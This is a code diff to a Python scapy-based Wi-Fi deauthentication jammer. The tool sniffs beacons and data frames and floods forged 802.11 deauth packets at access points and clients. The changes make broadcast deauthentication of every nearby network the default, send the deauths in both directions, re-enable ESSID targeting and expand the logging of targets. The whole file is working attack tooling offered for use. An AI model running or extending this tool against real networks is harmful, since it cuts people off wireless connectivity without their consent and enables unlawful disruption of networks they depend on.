@@ -25,10 +25,9 @@ from scapy.layers.eap   import EAPOL
 class JAMMER:
 
 	__ACCESSPOINTS = []
-	__FORGERS      = []
-	__ONRUN        = []
 
-	EXCEPTION      = ('ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:')
+	BROADCAST      = 'ff:ff:ff:ff:ff:ff'
+	EXCEPTION      = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']
 
 	def __init__(self, prs):
 		self.interface = prs.interface
@@ -40,11 +39,8 @@ class JAMMER:
 		self.code      = prs.code
 		self.delay     = prs.delay
 		self.packets   = prs.packets
-		self.broadcast = prs.broadcast
+		self.nobroadcast = prs.nobroadcast
 		self.verbose   = prs.verbose
-
-		if self.broadcast:
-			self.EXCEPTION.remove('ff:ff:ff:ff:ff:ff')
 
 	def extract_essid(self, layers):
 		essid = ''
@@ -59,6 +55,41 @@ class JAMMER:
 
 		return essid
 
+	def get_ess(self, sn, rc):
+		retval = ''
+
+		for ap in self.__ACCESSPOINTS:
+			if sn == ap.get('bssid') or rc == ap.get('bssid'):
+				retval = ap['essid']
+
+		return retval
+
+	def write(self, sender, receiver):
+		if self.verbose:
+			pull.print("*",
+				"Sent Deauths Count [{count}] Code [{code}] ({sdeveloper}) {sender} <--> ({rdeveloper}) {receiver} ({essid})".format(
+					count=pull.RED+str(self.packets)+pull.END,
+					code =pull.GREEN+str(self.code)+pull.END,
+					sender=pull.DARKCYAN+sender.upper().replace(":", "")+pull.END,
+					receiver=pull.DARKCYAN+receiver.upper().replace(":", "")+pull.END,
+					sdeveloper=pull.PURPLE+pull.get_mac(sender)+pull.END,
+					rdeveloper=pull.PURPLE+pull.get_mac(receiver)+pull.END,
+					essid=pull.YELLOW+self.get_ess(sender, receiver)+pull.END
+				),
+				pull.YELLOW
+			)
+		else:
+			pull.print("*",
+				"Sent Deauths Count [{count}] Code [{code}] {sender} <--> {receiver} ({essid})".format(
+					count=pull.RED+str(self.packets)+pull.END,
+					code =pull.GREEN+str(self.code)+pull.END,
+					sender=pull.DARKCYAN+sender.upper().replace(":", "")+pull.END,
+					receiver=pull.DARKCYAN+receiver.upper().replace(":", "")+pull.END,
+					essid=pull.YELLOW+self.get_ess(sender, receiver)+pull.END
+				),
+				pull.YELLOW
+			)
+
 	def forge(self, sn, rc):
 		pkt = RadioTap() / Dot11(
 			type=0, 
@@ -72,54 +103,26 @@ class JAMMER:
 
 		return pkt
 
-	def get_ess(self, sn, rc):
-		ess = ''
-		for key in self.__ACCESSPOINTS:
-			if key.get("bssid") == sn or key.get("bssid") == rc:
-				ess = key['essid']
-				break
-
-		return ess
-
-	def jammer(self, pkt, sn, rc):
-		send(
+	def jam(self, pkt, contra=False):
+		sendp(
 			pkt,
-			inter=self.delay,
 			iface=self.interface,
+			inter=self.delay,
 			count=self.packets,
-			loop=1,
+			loop=(1 if contra else 0),
 			verbose=False
 		)
 
 	def send(self, sender, receiver):
-		pkt = self.forge(sender, receiver)
-		essid = self.get_ess(sender, receiver)
-		
-		for bss in self.EXCEPTION:
-			if sender.startswith(bss) or receiver.startswith(bss):
-				return
+		pkta = self.forge(sender, receiver)
+		pktb = self.forge(receiver, sender)
 
-		if pkt not in self.__ONRUN:
-			self.__ONRUN.append( pkt )	
-			pull.print("*",
-				"Sent Deauths Count [{count}] Code [{code}] {sender} -> {receiver} ({essid})".format(
-					count=pull.RED+str(self.packets)+pull.END,
-					code =pull.GREEN+str(self.code)+pull.END,
-					sender=pull.DARKCYAN+sender.upper().replace(":", "")+pull.END,
-					receiver=pull.DARKCYAN+receiver.upper().replace(":", "")+pull.END,
-					essid=essid
-				),
-				pull.YELLOW
+		for pkt in (pkta, pktb):
+			self.jam(
+					pkt
 			)
 
-			sendp(
-				pkt,
-				inter=self.delay,
-				iface=self.interface,
-				count=self.packets,
-				loop=1,
-				verbose=False
-			)
+		self.write(sender, receiver)
 
 	def deauthenticate(self, sender, receiver):
 		if self.aps and self.stations and self.filters:
@@ -168,36 +171,62 @@ class JAMMER:
 					receiver
 				)
 		else:
-			self.send(sender, receiver)
+			self.send(
+				sender, receiver
+			)
 
 	def injector(self, pkt):
 		if pkt.haslayer(Dot11Beacon):
 			try:
-				macaddr = pkt.getlayer(Dot11FCS).addr2
+				bssid = pkt.getlayer(Dot11FCS).addr2
 			except:
-				macaddr = pkt.getlayer(Dot11).addr2
-			essid   = self.extract_essid(pkt.getlayer(Dot11Elt))
+				bssid = pkt.getlayer(Dot11).addr2
+
+			essid = self.extract_essid(pkt.getlayer(Dot11Elt))
 			toappend = {
-				'bssid': macaddr,
-				'essid': essid
+				'essid': essid,
+				'bssid': bssid
 			}
 			if toappend not in self.__ACCESSPOINTS:
 				self.__ACCESSPOINTS.append(
-						toappend
-					)
-				if self.broadcast:
-					self.deauthenticate( macaddr, "ff:ff:ff:ff:ff:ff" )
+					toappend
+				)
+				if (not self.nobroadcast) and (not self.aps) and (not self.stations) and (not self.essids) and (not self.filters):
+					pkt = self.forge(bssid, self.BROADCAST)
+					self.write(bssid, self.BROADCAST)
+					self.jam(pkt, contra=True)
+
 		elif pkt.haslayer(Dot11FCS) and pkt.getlayer(Dot11FCS).type == 2 and not pkt.haslayer(EAPOL):
 			sender   = pkt.getlayer(Dot11FCS).addr2
 			receiver = pkt.getlayer(Dot11FCS).addr1
 
-			self.deauthenticate(sender, receiver)
+			if (self.nobroadcast) or (self.aps) or (self.stations) or (self.essids) or (self.filters):
+				for bssid in self.EXCEPTION:
+					if sender.startswith( bssid ) or receiver.startswith( bssid ):
+						return
+
+				essid = self.get_ess(sender, receiver)
+				if essid:
+					if self.essids and essid in self.essids:
+						self.deauthenticate(sender, receiver)
+					else:
+						self.deauthenticate(sender, receiver)
 
 		elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2 and not pkt.haslayer(EAPOL):
 			sender   = pkt.getlayer(Dot11).addr2
 			receiver = pkt.getlayer(Dot11).addr1
 
-			self.deauthenticate(sender, receiver)
+			if (self.nobroadcast) or (self.aps) or (self.stations) or (self.essids) or (self.filters):
+				for bssid in self.EXCEPTION:
+					if sender.startswith( bssid ) or receiver.startswith( bssid ):
+						return
+
+				essid = self.get_ess(sender, receiver)
+				if essid:
+					if self.essids and essid in self.essids:
+						self.deauthenticate(sender, receiver)
+					else:
+						self.deauthenticate(sender, receiver)
 
 	def hopper(self, chs):
 		if type(chs) == tuple:
@@ -226,7 +255,7 @@ class PARSER:
 		self.help = self.help(opts.help)
 		self.interface = self.interface(opts.interface)
 		self.channel   = self.channel(opts.channel)
-		#self.essids    = self.essids(opts.essids)
+		self.essids    = self.essids(opts.essids)
 		self.aps       = self.aps(opts.aps)
 		self.stations  = self.stations(opts.stations)
 		self.filters   = self.filters(opts.filters)
@@ -234,7 +263,7 @@ class PARSER:
 		self.delay     = opts.delay if opts.delay >= 0 else pull.halt("Invalid Delay Between Requests", True, pull.RED)
 		self.packets   = opts.packets if opts.packets > 0 else pull.halt("Packets Must Be greater than 0", True, pull.RED)
 		self.verbose   = opts.verbose
-		self.broadcast = opts.broadcast
+		self.nobroadcast = opts.nobroadcast
 		self.signal    = signal.signal(signal.SIGINT, self.handler)
 
 	def handler(self, sig, fr):
@@ -347,14 +376,14 @@ def main():
 	parser.add_argument('-h', '--help', dest="help", default=False, action="store_true")
 	parser.add_argument('-i', '--interface', dest="interface", default="", type=str)
 	parser.add_argument('-c', '--channel'  , dest="channel"  , default=0 , type=int)
-	#parser.add_argument('-e', '-essids'    , dest="essids"   , default="", type=str)
+	parser.add_argument('-e', '--essids'    , dest="essids"   , default="", type=str)
 	parser.add_argument('-a', '--access-points', dest="aps"  , default="", type=str)
 	parser.add_argument('-s', '--stations' , dest="stations" , default="", type=str)
 	parser.add_argument('-f', '--filters'  , dest="filters"  , default="", type=str)
 	parser.add_argument('--code'           , dest="code"     , default=7 , type=int)
 	parser.add_argument('--delay'          , dest="delay"    , default=0.1 , type=int)
 	parser.add_argument('--packets'        , dest="packets"  , default=1, type=int)
-	parser.add_argument('--broadcast'      , dest="broadcast", default=False, action="store_true")
+	parser.add_argument('--no-broadcast'   , dest="nobroadcast", default=False, action="store_true")
 	parser.add_argument('--verbose'        , dest="verbose"  , default=False, action="store_true")
 
 	options = parser.parse_args()
